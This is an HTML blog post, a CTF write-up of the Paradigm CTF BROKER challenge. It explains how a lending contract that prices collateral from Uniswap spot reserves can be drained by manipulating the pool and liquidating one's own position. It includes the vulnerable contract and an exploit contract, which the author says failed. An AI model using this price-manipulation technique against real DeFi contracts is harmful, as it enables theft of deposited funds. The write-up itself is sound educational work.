@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="chrome=1">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="referrer" content="no-referrer">
+
+        <link rel="stylesheet" href="https://binarycake.ca/fonts.css">
+        <link rel="stylesheet" href="https://binarycake.ca/style.css">
+
+        <title>
+    BROKER Challenge - Paradigm CTF (Part 2 of 3)
+</title>
+
+        
+    </head>
+    <body>
+        
+    <div class="wrap">
+        <div class="section" id="title">
+            
+    BROKER Challenge - Paradigm CTF (Part 2 of 3)
+
+        </div>
+        <div class="section" id="content">
+            
+    
+        
+            
+    
+    Sun Feb 14, 2021
+
+        
+        
+            
+                &#183; 1742 words
+            
+        
+        
+            
+            
+                &#183; 9 min
+            
+        
+        
+        <hr/>
+    
+    <style>
+pre {
+line-height: 1.3em !important;
+}
+</style>
+<h2 id="introduction">Introduction</h2>
+<p>In my <a href="https://binarycake.ca/posts/paradigm-ctf/">previous post</a>, I gave a short summary of the BABYCRYPTO challenge from Paradigm's recent Capture the Flag competition. This time around, I'll be walking through the BROKER challenge, which <a href="https://twitter.com/lightclients">@lightclients</a> and I solved together. If you'd like more details on the competition or the format of the challenges, go and give my <a href="https://binarycake.ca/posts/paradigm-ctf/">previous post</a> a read first.</p>
+<h2 id="challenges">Challenges</h2>
+<h3 id="broker">BROKER</h3>
+<p>After BABYCRYPTO, I joined <a href="https://twitter.com/lightclients">@lightclients</a> on the BROKER challenge:</p>
+<p><img src="./broker.png" alt="This broker has pretty good rates" /></p>
+<p>From the description, we initially assumed this challenge would have something to do with either a logic error in a contract, or some sort of market manipulation. Here's what was in the archive:</p>
+<pre><font color="#3465A4"><b>.</b></font>
+└── <font color="#3465A4"><b>broker</b></font>
+    └── <font color="#3465A4"><b>public</b></font>
+        ├── <font color="#3465A4"><b>contracts</b></font>
+        │   ├── Broker.sol
+        │   └── Setup.sol
+        ├── <font color="#3465A4"><b>deploy</b></font>
+        │   ├── chal.py
+        │   ├── compiled.bin
+        │   └── requirements.txt
+        └── Dockerfile
+</pre>
+<p>This format, which differed from BABYCRYPTO, was the same for all of the other challenges: <code>chal.py</code> did some magic to spin up a test chain (either <code>ganache</code> or <code>hardhat</code>) and then would check <a href="./Setup.sol"><code>Setup.sol</code></a> before releasing the flag.</p>
+<h4 id="win-condition">Win Condition</h4>
+<p>Let's take a look at the win condition for BROKER to narrow down what we're looking for:</p>
+<pre data-lang="solidity" style="background-color:#2b303b;color:#c0c5ce;" class="language-solidity "><code class="language-solidity" data-lang="solidity"><span>function isSolved() public view returns (bool) {
+</span><span>    return weth.balanceOf(address(broker)) &lt; 5 ether;
+</span><span>}
+</span></code></pre>
+<p>In other words, we're looking to reduce the Wrapped ETH (aka. <a href="https://weth.io/"><code>weth</code></a>, an ERC-20 representing ETH) balance of some address <code>broker</code> to less than five ether.</p>
+<h4 id="environment">Environment</h4>
+<p>The <code>Setup.sol</code> contract gives us quite a bit of information about the chain and the contracts we'll have at our disposal. Starting with the first two constants in <code>Setup</code>:</p>
+<pre data-lang="solidity" style="background-color:#2b303b;color:#c0c5ce;" class="language-solidity "><code class="language-solidity" data-lang="solidity"><span>WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+</span><span>IUniswapV2Factory public constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
+</span></code></pre>
+<p>What immediately sticks out is that we have an <a href="https://uniswap.org/docs/v2/smart-contracts/factory/"><code>IUniswapV2Factory</code></a> deployed at <a href="https://etherscan.io/address/0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f"><code>0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</code></a>. That's the same address as Uniswap on mainnet, implying we're running on a fork of mainnet! That gives us a <em>ton</em> of tools like flashloans, the rest of Uniswap, and pretty much anything else you can think of. Great. The <code>weth</code> address also matches the mainnet token, so we have twice the confirmation<sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
+<p>That's not all <code>Setup.sol</code> has to offer. We've got a mysterious <code>Token</code> contract, with an <code>airdrop</code> function:</p>
+<pre data-lang="solidity" style="background-color:#2b303b;color:#c0c5ce;" class="language-solidity "><code class="language-solidity" data-lang="solidity"><span>function airdrop() public {
+</span><span>    require(!dropped[msg.sender], &quot;err: only once&quot;);
+</span><span>    dropped[msg.sender] = true;
+</span><span>    balanceOf[msg.sender] += AMT;
+</span><span>    totalSupply += AMT;
+</span><span>}
+</span></code></pre>
+<p>So we can get our dirty degen hands on some tokens! What does the token have to do with Uniswap? Well, the setup creates a Uniswap trading pair:</p>
+<pre data-lang="solidity" style="background-color:#2b303b;color:#c0c5ce;" class="language-solidity "><code class="language-solidity" data-lang="solidity"><span>pair = IUniswapV2Pair(factory.createPair(address(weth), address(token)));
+</span></code></pre>
+<p>Then it adds an initial liquidity pool between WETH and our magical token:</p>
+<pre data-lang="solidity" style="background-color:#2b303b;color:#c0c5ce;" class="language-solidity "><code class="language-solidity" data-lang="solidity"><span style="color:#65737e;">// 1:25
+</span><span>weth.transfer(address(pair), 25 ether);
+</span><span>token.transfer(address(pair), 500_000 * DECIMALS);
+</span><span>pair.mint(address(this));
+</span></code></pre>
+<p>So, to summarize:</p>
+<ul>
+<li>We're on a fork of mainnet, and have access to all the wonderful finance tools therein.</li>
+<li>We have a magical token (MagicToken from now on.)</li>
+<li>We can get a fat stack of MagicToken, but only once.</li>
+<li>We have a Uniswap pair that can trade WETH for MagicToken.</li>
+</ul>
+<h5 id="aside-what-is-uniswap">Aside: What is Uniswap?</h5>
+<p>I'm not going to pretend to be an expert on Uniswap. There <a href="https://uniswap.org/docs/v2/protocol-overview/how-uniswap-works/">are</a> <a href="https://www.youtube.com/watch?v=Ui1TBPdnEJU">much</a> <a href="https://docs.ethhub.io/guides/graphical-guide-for-understanding-uniswap/">better</a> <a href="https://academy.binance.com/en/articles/what-is-uniswap-and-how-does-it-work">places</a> to learn about its many intricate details. Here's what I understand about Uniswap and what ended up being relevant to this challenge:</p>
+<ul>
+<li>Uniswap is a decentralized exchange where users can swap between pairs of tokens.</li>
+<li>Each trading pair is represented by an on-chain contract with the <code>IUniswapV2Pair</code> interface.</li>
+<li>The pair contract maintains a balance of each token.</li>
+<li>The exchange rate between tokens in a pair is determined by the ratio of the contract's balance of each token (something like <code>token0.balanceOf(pair) / token1.balanceOf(pair)</code>.)</li>
+<li>Finally, the most important: <strong>swapping one token for the other changes the ratio, and therefore changes the exchange rate</strong>.</li>
+</ul>
+<h4 id="target">Target</h4>
+<p>Here is the <code>Broker</code> contract from <a href="./Broker.sol"><code>Broker.sol</code></a>:</p>
+<pre data-lang="solidity" style="background-color:#2b303b;color:#c0c5ce;" class="language-solidity "><code class="language-solidity" data-lang="solidity"><span style="color:#65737e;">// a simple overcollateralized loan bank which accepts WETH as collateral and a
+</span><span style="color:#65737e;">// token for borrowing. 0% APRs
+</span><span style="color:#b48ead;">contract </span><span style="color:#ebcb8b;">Broker </span><span>{
+</span><span>    IUniswapV2Pair </span><span style="color:#b48ead;">public </span><span>pair;
+</span><span>    WETH9 </span><span style="color:#b48ead;">public constant </span><span>weth = </span><span style="color:#96b5b4;">WETH9</span><span>(</span><span style="color:#d08770;">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span>);
+</span><span>    ERC20Like </span><span style="color:#b48ead;">public </span><span>token;
+</span><span>
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">mapping</span><span>(</span><span style="color:#d08770;">address </span><span style="color:#b48ead;">=&gt; </span><span style="color:#d08770;">uint256</span><span>) </span><span style="color:#b48ead;">public</span><span> deposited;
+</span><span>    </span><span style="color:#b48ead;">mapping</span><span>(</span><span style="color:#d08770;">address </span><span style="color:#b48ead;">=&gt; </span><span style="color:#d08770;">uint256</span><span>) </span><span style="color:#b48ead;">public</span><span> debt;
+</span><span>
+</span><span>    </span><span style="color:#8fa1b3;">constructor </span><span>(IUniswapV2Pair _pair, ERC20Like _token) {
+</span><span>        pair = _pair;
+</span><span>        token = _token;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">rate</span><span>() </span><span style="color:#b48ead;">public view returns </span><span>(</span><span style="color:#d08770;">uint256</span><span>) {
+</span><span>        (</span><span style="color:#d08770;">uint112 </span><span>_reserve0, </span><span style="color:#d08770;">uint112 </span><span>_reserve1,) = pair.</span><span style="color:#96b5b4;">getReserves</span><span>();
+</span><span>        </span><span style="color:#d08770;">uint256 </span><span>_rate = </span><span style="color:#d08770;">uint256</span><span>(_reserve0 / _reserve1);
+</span><span>        </span><span style="color:#b48ead;">return</span><span> _rate;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">safeDebt</span><span>(</span><span style="color:#d08770;">address </span><span>user) </span><span style="color:#b48ead;">public view returns </span><span>(</span><span style="color:#d08770;">uint256</span><span>) {
+</span><span>        </span><span style="color:#b48ead;">return</span><span> deposited[user] * </span><span style="color:#96b5b4;">rate</span><span>() * </span><span style="color:#d08770;">2 </span><span>/ 3;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#65737e;">// borrow some tokens
+</span><span>    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">borrow</span><span>(</span><span style="color:#d08770;">uint256 </span><span>amount) </span><span style="color:#b48ead;">public </span><span>{
+</span><span>        debt[</span><span style="color:#d08770;">msg.sender</span><span>] += amount;
+</span><span>        </span><span style="color:#b48ead;">require</span><span>(</span><span style="color:#96b5b4;">safeDebt</span><span>(</span><span style="color:#d08770;">msg.sender</span><span>) &gt;= debt[</span><span style="color:#d08770;">msg.sender</span><span>], </span><span style="color:#a3be8c;">&quot;err: undercollateralized&quot;</span><span>);
+</span><span>        token.</span><span style="color:#96b5b4;">transfer</span><span>(</span><span style="color:#d08770;">msg.sender</span><span>, amount);
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#65737e;">// repay your loan
+</span><span>    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">repay</span><span>(</span><span style="color:#d08770;">uint256 </span><span>amount) </span><span style="color:#b48ead;">public </span><span>{
+</span><span>        debt[</span><span style="color:#d08770;">msg.sender</span><span>] -= amount;
+</span><span>        token.</span><span style="color:#96b5b4;">transferFrom</span><span>(</span><span style="color:#d08770;">msg.sender</span><span>, </span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>), amount);
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#65737e;">// repay a user&#39;s loan and get back their collateral. no discounts.
+</span><span>    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">liquidate</span><span>(</span><span style="color:#d08770;">address </span><span>user, </span><span style="color:#d08770;">uint256 </span><span>amount) </span><span style="color:#b48ead;">public returns </span><span>(</span><span style="color:#d08770;">uint256</span><span>) {
+</span><span>        </span><span style="color:#b48ead;">require</span><span>(</span><span style="color:#96b5b4;">safeDebt</span><span>(user) &lt;= debt[user], </span><span style="color:#a3be8c;">&quot;err: overcollateralized&quot;</span><span>);
+</span><span>        debt[user] -= amount;
+</span><span>        token.</span><span style="color:#96b5b4;">transferFrom</span><span>(</span><span style="color:#d08770;">msg.sender</span><span>, </span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>), amount);
+</span><span>        </span><span style="color:#d08770;">uint256 </span><span>collateralValueRepaid = amount / </span><span style="color:#96b5b4;">rate</span><span>();
+</span><span>        weth.</span><span style="color:#96b5b4;">transfer</span><span>(</span><span style="color:#d08770;">msg.sender</span><span>, collateralValueRepaid);
+</span><span>        </span><span style="color:#b48ead;">return</span><span> collateralValueRepaid;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#65737e;">// top up your collateral
+</span><span>    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">deposit</span><span>(</span><span style="color:#d08770;">uint256 </span><span>amount) </span><span style="color:#b48ead;">public </span><span>{
+</span><span>        deposited[</span><span style="color:#d08770;">msg.sender</span><span>] += amount;
+</span><span>        weth.</span><span style="color:#96b5b4;">transferFrom</span><span>(</span><span style="color:#d08770;">msg.sender</span><span>, </span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>), amount);
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#65737e;">// remove collateral
+</span><span>    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">withdraw</span><span>(</span><span style="color:#d08770;">uint256 </span><span>amount) </span><span style="color:#b48ead;">public </span><span>{
+</span><span>        deposited[</span><span style="color:#d08770;">msg.sender</span><span>] -= amount;
+</span><span>        </span><span style="color:#b48ead;">require</span><span>(</span><span style="color:#96b5b4;">safeDebt</span><span>(</span><span style="color:#d08770;">msg.sender</span><span>) &gt;= debt[</span><span style="color:#d08770;">msg.sender</span><span>], </span><span style="color:#a3be8c;">&quot;err: undercollateralized&quot;</span><span>);
+</span><span>
+</span><span>        weth.</span><span style="color:#96b5b4;">transfer</span><span>(</span><span style="color:#d08770;">msg.sender</span><span>, amount);
+</span><span>    }
+</span><span>}
+</span></code></pre>
+<p>From the comment and code, we can figure out how this contract is supposed to work:</p>
+<ol>
+<li>You <code>deposit</code> some amount of WETH into the <code>Broker</code> contract, to use as collateral later on.</li>
+<li>You <code>borrow</code> some amount of MagicToken, limited by how much collateral you've deposited (calculated in <code>safeDebt</code>.)</li>
+<li>Any number of:
+<ol>
+<li>You <code>repay</code> some/all of your debt, in MagicTokens.</li>
+<li>You <code>withdraw</code> collateral, limited by how much you have borrowed (calculated by <code>safeDebt</code> again.)</li>
+<li>Your <code>safeDebt</code> value falls below your current debt, and someone <code>liquidate</code>s your position.</li>
+</ol>
+</li>
+</ol>
+<h4 id="the-attack">The Attack</h4>
+<h5 id="inception">Inception</h5>
+<p>Armed with the information above, we can start sketching out our attack:</p>
+<ul>
+<li>We need to drop the <code>Broker</code>'s WETH balance below 5 ether.</li>
+<li>The <code>Broker</code> sends WETH in two places: <code>withdraw</code> and <code>liquidate</code>.</li>
+<li><code>withdraw</code> is pretty simple, so isn't a likely target for exploit.</li>
+<li><code>liquidate</code> calls into <code>safeDebt</code> <strong>and</strong> <code>rate</code>! This is a likely target.</li>
+</ul>
+<h5 id="toolbox">Toolbox</h5>
+<p>What can we manipulate in <code>liquidate</code>? We have access to:</p>
+<ul>
+<li>Amount deposited (<code>deposit</code> / <code>withdraw</code>),</li>
+<li>Amount borrowed (<code>borrow</code> / <code>repay</code>), and</li>
+<li>Ratio (<code>rate</code>) between WETH and MagicToken (by buying or selling on Uniswap).</li>
+</ul>
+<h5 id="instructions">Instructions</h5>
+<p>So here's our attack strategy:</p>
+<ol>
+<li>Increase <code>rate()</code> as much as possible, by buying up, uh, <code>token1</code> and/or selling <code>token0</code>?</li>
+<li>Deposit some collateral.</li>
+<li>Borrow a bunch of MagicTokens.</li>
+<li>Crash <code>rate()</code> by selling <code>token1</code> and/or buying <code>token0</code>.</li>
+<li>Liquidate our own position, extracting WETH from the contract.</li>
+<li>Repeat!</li>
+</ol>
+<h5 id="difficulties">Difficulties</h5>
+<p>There are a couple issues here that I didn't quite realize until later on. Which token is the numerator and which is the denominator in <code>rate()</code>? How do you even make a trade on Uniswap?</p>
+<h4 id="the-exploit-attempt-1">The Exploit (Attempt #1)</h4>
+<p>We (or rather, I) charged ahead and wrote an <a href="./Exploit.sol">exploit contract</a>. I don't mind taking all of the credit for this abomination because, spoiler alert, it didn't work.</p>
+<p>Here are the most relevant bits:</p>
+<pre data-lang="solidity" style="background-color:#2b303b;color:#c0c5ce;" class="language-solidity "><code class="language-solidity" data-lang="solidity"><span style="color:#b48ead;">contract </span><span style="color:#ebcb8b;">Exploit </span><span>{
+</span><span>    IERC20 </span><span style="color:#b48ead;">immutable </span><span>token0;
+</span><span>    IERC20 </span><span style="color:#b48ead;">immutable </span><span>token1;
+</span><span>
+</span><span>    IUniswapV2PairReal </span><span style="color:#b48ead;">immutable </span><span>pair;
+</span><span>    Broker </span><span style="color:#b48ead;">immutable </span><span>broker;
+</span><span>
+</span><span>    Token </span><span style="color:#b48ead;">immutable </span><span>token;
+</span><span>    WETH9 </span><span style="color:#b48ead;">immutable </span><span>weth;
+</span><span>
+</span><span>    </span><span style="color:#65737e;">// The Uniswap router contract exposes some higher level APIs for doing a swap.
+</span><span>    </span><span style="color:#65737e;">// Instead of figuring out how to invoke the pair directly, I used the router.
+</span><span>    IUniswapV2Router02 </span><span style="color:#b48ead;">constant </span><span>router = </span><span style="color:#96b5b4;">IUniswapV2Router02</span><span>(</span><span style="color:#d08770;">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span><span>);
+</span><span>
+</span><span>    </span><span style="color:#8fa1b3;">constructor</span><span>(Setup setup) </span><span style="color:#b48ead;">payable </span><span>{
+</span><span>        </span><span style="color:#65737e;">// Collect some useful addresses.
+</span><span>        IUniswapV2PairReal _pair = </span><span style="color:#96b5b4;">IUniswapV2PairReal</span><span>(</span><span style="color:#d08770;">address</span><span>(setup.</span><span style="color:#96b5b4;">pair</span><span>()));
+</span><span>        Token _token = setup.</span><span style="color:#96b5b4;">token</span><span>();
+</span><span>        IERC20 _token0 = </span><span style="color:#96b5b4;">IERC20</span><span>(_pair.</span><span style="color:#96b5b4;">token0</span><span>());
+</span><span>        IERC20 _token1 = </span><span style="color:#96b5b4;">IERC20</span><span>(_pair.</span><span style="color:#96b5b4;">token1</span><span>());
+</span><span>        Broker _broker = setup.</span><span style="color:#96b5b4;">broker</span><span>();
+</span><span>        WETH9 _weth = setup.</span><span style="color:#96b5b4;">weth</span><span>();
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Mint ourselves some WETH to use later on.
+</span><span>        _weth.deposit{value</span><span style="color:#b48ead;">: </span><span style="color:#d08770;">msg.value</span><span>}();
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Get some of that sweet MagicToken airdropped.
+</span><span>        _token.</span><span style="color:#96b5b4;">airdrop</span><span>();
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Flail around approving every combination of token and operator!
+</span><span>        _token0.</span><span style="color:#96b5b4;">approve</span><span>(</span><span style="color:#d08770;">address</span><span>(router), </span><span style="color:#96b5b4;">type</span><span>(uint256).max);
+</span><span>        _token0.</span><span style="color:#96b5b4;">approve</span><span>(</span><span style="color:#d08770;">address</span><span>(_broker), </span><span style="color:#96b5b4;">type</span><span>(uint256).max);
+</span><span>
+</span><span>        _token1.</span><span style="color:#96b5b4;">approve</span><span>(</span><span style="color:#d08770;">address</span><span>(router), </span><span style="color:#96b5b4;">type</span><span>(uint256).max);
+</span><span>        _token1.</span><span style="color:#96b5b4;">approve</span><span>(</span><span style="color:#d08770;">address</span><span>(_broker), </span><span style="color:#96b5b4;">type</span><span>(uint256).max);
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Store some constants for later.
+</span><span>        weth = _weth;
+</span><span>        token0 = _token0;
+</span><span>        token1 = _token1;
+</span><span>        pair = _pair;
+</span><span>        broker = _broker;
+</span><span>        token = _token;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">run</span><span>() </span><span style="color:#b48ead;">external </span><span>{
+</span><span>        </span><span style="color:#65737e;">// Figure out how much of token0 we have.
+</span><span>        </span><span style="color:#d08770;">uint256 </span><span>t0Balance = token0.</span><span style="color:#96b5b4;">balanceOf</span><span>(</span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>));
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Prepare the &quot;route&quot; we need to trade through to swap token0 for token1.
+</span><span>        </span><span style="color:#d08770;">address</span><span>[] </span><span style="color:#b48ead;">memory </span><span>path = </span><span style="color:#b48ead;">new</span><span> address[](</span><span style="color:#d08770;">2</span><span>);
+</span><span>        path[</span><span style="color:#d08770;">0</span><span>] = </span><span style="color:#d08770;">address</span><span>(token0);
+</span><span>        path[</span><span style="color:#d08770;">1</span><span>] = </span><span style="color:#d08770;">address</span><span>(token1);
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Do the exchange!
+</span><span>        </span><span style="color:#65737e;">// I only used half of our balance of token0 because we needed some left over for later.
+</span><span>        router.</span><span style="color:#96b5b4;">swapExactTokensForTokens</span><span>(t0Balance / 2, 1, path, </span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>), </span><span style="color:#96b5b4;">type</span><span>(uint256).max);
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Deposit collateral, again only using half in case we needed more.
+</span><span>        </span><span style="color:#d08770;">uint256 </span><span>wBalance = weth.</span><span style="color:#96b5b4;">balanceOf</span><span>(</span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>));
+</span><span>        broker.</span><span style="color:#96b5b4;">deposit</span><span>(wBalance / 2);
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Borrow as much MagicToken as we can!
+</span><span>        </span><span style="color:#d08770;">uint256 </span><span>borrowed = broker.</span><span style="color:#96b5b4;">safeDebt</span><span>(</span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>));
+</span><span>        broker.</span><span style="color:#96b5b4;">borrow</span><span>(borrowed);
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Get our balance of token1 to swap it back
+</span><span>        </span><span style="color:#d08770;">uint256 </span><span>t1Balance = token1.</span><span style="color:#96b5b4;">balanceOf</span><span>(</span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>));
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Invert the route
+</span><span>        (path[</span><span style="color:#d08770;">0</span><span>], path[</span><span style="color:#d08770;">1</span><span>]) = (path[</span><span style="color:#d08770;">1</span><span>], path[</span><span style="color:#d08770;">0</span><span>]);
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Swap!
+</span><span>        router.</span><span style="color:#96b5b4;">swapExactTokensForTokens</span><span>(t1Balance - borrowed, 1, path, </span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>), </span><span style="color:#96b5b4;">type</span><span>(uint256).max);
+</span><span>
+</span><span>        </span><span style="color:#65737e;">// Liquidate ourselves.
+</span><span>        broker.</span><span style="color:#96b5b4;">liquidate</span><span>(</span><span style="color:#d08770;">address</span><span>(</span><span style="color:#b48ead;">this</span><span>), borrowed);
+</span><span>    }
+</span><span>}
+</span></code></pre>
+<h4 id="the-exploit-attempt-2">The Exploit (Attempt #2)</h4>
+<p>Now, obviously, this didn't work. Why? I never bothered to find out. To debug the contract, we set up Remix so we could access all the relevant parts. We had buttons to swap. We had buttons to borrow. We had so many buttons we didn't know what to do with them all.</p>
+<p>We manually went through the steps in the contract. First manipulating the pair to raise <code>safeDebt</code>, then we deposited and borrowed, swapped the tokens back, and then called <code>liquidate</code>. The contract sent us WETH. Its balance had dropped. We rejoiced, and repeated the process. I wish I could say we were methodical or principled in our approach, but honestly we just swapped progressively smaller amounts until we eventually dropped the broker below the goal.</p>
+<p>So children, it turns out you don't need a fancy exploit, all you need is Remix, about a million buttons, and a dream.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>That's another one down! My next post will be on the BABYREV challenge, which was about 1% reverse engineering and 99% perseverance.</p>
+<h2 id="footnotes">Footnotes</h2>
+<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
+<p>As it turns out, most (and likely all) of the eth challenges were forked off of mainnet.</p>
+</div>
+
+
+        </div>
+        
+    <div class="section bottom-menu">
+        <hr/>
+        <p>
+            
+                
+                    <a href="&#x2F;posts">posts</a>
+                    &#183;
+                
+                    <a href="https:&#x2F;&#x2F;github.com&#x2F;samwilsn">github</a>
+                    &#183;
+                
+                    <a href="https:&#x2F;&#x2F;twitter.com&#x2F;_samwilsn_">twitter</a>
+                    &#183;
+                
+            
+            <a href="https:&#x2F;&#x2F;binarycake.ca">
+                home
+            </a>
+        </p>
+    </div>
+
+        
+    
+
+    </div>
+
+    </body>
+</html>
